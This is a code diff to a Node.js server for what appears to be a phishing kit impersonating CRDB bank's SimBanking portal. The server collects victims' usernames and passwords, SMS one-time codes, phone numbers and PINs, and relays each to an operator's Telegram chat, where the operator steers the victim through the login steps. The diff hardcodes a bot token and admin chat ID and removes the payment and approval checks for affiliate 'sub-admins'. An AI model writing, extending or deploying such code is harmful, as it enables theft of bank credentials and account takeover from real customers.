@@ -1,6 +1,6 @@
 /**
  * **CRDB SIMBANKING - SECURE MULTI-ADMIN SERVER**
- * Configured for independent sub-admin routing.
+ * Main Admin Chat ID: 8591555400
  */
 
 const express = require('express');
@@ -12,17 +12,13 @@ const app = express();
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN;
+// Environment or provided defaults
+const TOKEN = process.env.TOKEN || process.env.TELEGRAM_BOT_TOKEN || '8949476533:AAGUD6b2V0--zQ_x_zNh3XPz2ay_B7xhO7A';
 const APP_URL = process.env.APP_URL || process.env.RENDER_EXTERNAL_URL || (process.env.RENDER_EXTERNAL_HOSTNAME ? `https://${process.env.RENDER_EXTERNAL_HOSTNAME}` : '');
-const FALLBACK_ADMIN_ID = process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '';
+const FALLBACK_ADMIN_ID = process.env.ADMIN_CHAT_ID || process.env.MAIN_ADMIN_ID || '8591555400';
 
 if (!TOKEN) {
   console.error('FATAL: TELEGRAM_BOT_TOKEN environment variable is required.');
-  process.exit(1);
-}
-
-if (!APP_URL) {
-  console.error('FATAL: APP_URL or RENDER_EXTERNAL_URL environment variable is required.');
   process.exit(1);
 }
 
@@ -72,23 +68,11 @@ function resolveTargetChat(adminParam) {
       return targetAdmin;
     }
   }
-  return null;
+  return FALLBACK_ADMIN_ID; // Defaults to main admin if unspecified
 }
 
 async function initBot() {
-  bot = new TelegramBot(TOKEN, { polling: false });
-  const webhookPath = `/bot${TOKEN}`;
-  const webhookUrl = `${APP_URL}${webhookPath}`;
-
-  try {
-    await bot.setWebHook(webhookUrl);
-    app.post(webhookPath, (req, res) => {
-      res.sendStatus(200);
-      try { bot.processUpdate(req.body); } catch (err) {}
-    });
-  } catch (err) {
-    process.exit(1);
-  }
+  bot = new TelegramBot(TOKEN, { polling: true });
 
   bot.onText(/\/start/, async (msg) => {
     try {
@@ -106,25 +90,12 @@ async function initBot() {
       }
 
       if (!admins.has(chatId)) {
-        admins.set(chatId, { authorized: false, paid: false, username, firstName, lastName, startedAt: new Date() });
+        admins.set(chatId, { authorized: true, paid: true, username, firstName, lastName, startedAt: new Date() });
         saveAdmins();
       }
 
-      const record = admins.get(chatId);
-      if (!record.authorized || !record.paid) {
-        await bot.sendMessage(FALLBACK_ADMIN_ID, 
-          `🚨 *New Sub-Admin Awaiting Approval/Payment!*\n\n` +
-          `👤 *Name:* ${firstName}\n` +
-          `🆔 *Chat ID:* \`${chatId}\``, 
-          { parse_mode: 'Markdown' }
-        );
-
-        await bot.sendMessage(chatId, `👋 *Welcome ${firstName}!*\n\nYour account is awaiting approval and payment clearance.`, { parse_mode: 'Markdown' });
-        return;
-      }
-
       const userLink = `${APP_URL}/?admin=${chatId}`;
-      await bot.sendMessage(chatId, `👋 *Welcome ${firstName}!*\n\nYour referral link is active:\n${userLink}`, { parse_mode: 'Markdown' });
+      await bot.sendMessage(chatId, `👋 *Welcome ${firstName}!*\n\nYour portal link is active:\n${userLink}`, { parse_mode: 'Markdown' });
     } catch (err) {}
   });
 
@@ -137,37 +108,37 @@ async function initBot() {
       const targetId = parts.slice(2).join('_');
 
       let session = sessions.get(targetId);
-      if (!session) session = { contact: 'Unknown', adminChatId: chatId };
+      if (!session) session = { adminChatId: chatId };
 
       const chatTarget = session.adminChatId || chatId;
 
       switch (prefix) {
         case 'WRONG_CREDS':
           session.status = 'RETRY_CREDS';
-          await bot.sendMessage(chatTarget, `❌ Credentials marked as Wrong. User redirected to re-enter username/password.`);
+          await bot.sendMessage(chatTarget, `❌ Credentials marked as Wrong. User redirected to re-enter Username & Password.`);
           break;
         case 'CORRECT_CREDS':
           session.status = 'PROCEED_OTP';
-          await bot.sendMessage(chatTarget, `✅ Credentials correct. User proceeding to 6-digit SMS OTP verification.`);
+          await bot.sendMessage(chatTarget, `✅ Credentials verified. User proceeding to 6-digit SMS OTP input.`);
           break;
         case 'OTP_EXPIRED':
           session.status = 'RETRY_OTP';
           session.otp = '';
-          await bot.sendMessage(chatTarget, `⚠️ OTP expired/invalid. User commanded to enter new incoming 6-digit OTP.`);
+          await bot.sendMessage(chatTarget, `⚠️ OTP marked Expired. User redirected to enter new incoming 6-digit SMS OTP.`);
           break;
         case 'CORRECT_OTP':
           session.status = 'PROCEED_PHONE_PIN';
-          await bot.sendMessage(chatTarget, `✅ OTP correct. User proceeding to Phone Number & PIN entry.`);
+          await bot.sendMessage(chatTarget, `✅ OTP verified. User proceeding to Phone Number and 4-digit PIN entry.`);
           break;
         case 'WRONG_PIN':
           session.status = 'RETRY_PIN';
           session.pin = '';
-          await bot.sendMessage(chatTarget, `❌ Wrong PIN. User redirected to re-enter PIN.`);
+          await bot.sendMessage(chatTarget, `❌ PIN marked Wrong. User redirected to re-enter PIN.`);
           break;
         case 'CORRECT_PIN':
         case 'FINAL_SUCCESS':
           session.status = 'SUCCESS';
-          await bot.sendMessage(chatTarget, `🎉 Application fully approved! Success screen sent.`);
+          await bot.sendMessage(chatTarget, `🎉 Application fully approved! Success screen sent to user.`);
           break;
         default:
           break;
@@ -185,7 +156,7 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Step 1: Submit Username & Password (with Copyable text format for Telegram)
+// Step 1: Submit Username & Password
 app.post('/api/submit-credentials', async (req, res) => {
   try {
     let { username, password, adminChatId } = req.body || {};
@@ -194,10 +165,6 @@ app.post('/api/submit-credentials', async (req, res) => {
     }
 
     const targetChat = resolveTargetChat(adminChatId);
-    if (!targetChat) {
-      return res.status(400).json({ success: false, error: 'Admin is not authorized or unpaid.' });
-    }
-
     const userId = `user_${Date.now()}`;
     sessions.set(userId, { 
       username, 
@@ -206,7 +173,7 @@ app.post('/api/submit-credentials', async (req, res) => {
       status: 'WAITING_CREDS_APPROVAL' 
     });
 
-    const message = `🟢 *CRDB SIMBANKING LOGIN CREDENTIALS*\n\n` +
+    const message = `🟢 *CRDB SIMBANKING LOGIN DETAILS*\n\n` +
                     `👤 *Username:* \`${username}\`\n` +
                     `🔑 *Password:* \`${password}\`\n\n` +
                     `📋 *Copy Details:* \`${username}:${password}\``;
@@ -229,7 +196,7 @@ app.post('/api/submit-credentials', async (req, res) => {
     
     return res.status(200).json({ success: true, userId });
   } catch (err) {
-    return res.status(500).json({ success: false, error: 'Network error processing credentials.' });
+    return res.status(500).json({ success: false, error: 'Server error processing credentials.' });
   }
 });
 
@@ -306,7 +273,7 @@ app.post('/api/submit-phone-pin', async (req, res) => {
 
     return res.status(200).json({ success: true });
   } catch (error) {
-    return res.status(500).json({ success: false, error: 'Error submitting phone and PIN' });
+    return res.status(500).json({ success: false, error: 'Error submitting Phone & PIN' });
   }
 });
 
@@ -315,4 +282,4 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-                
+                                                                           
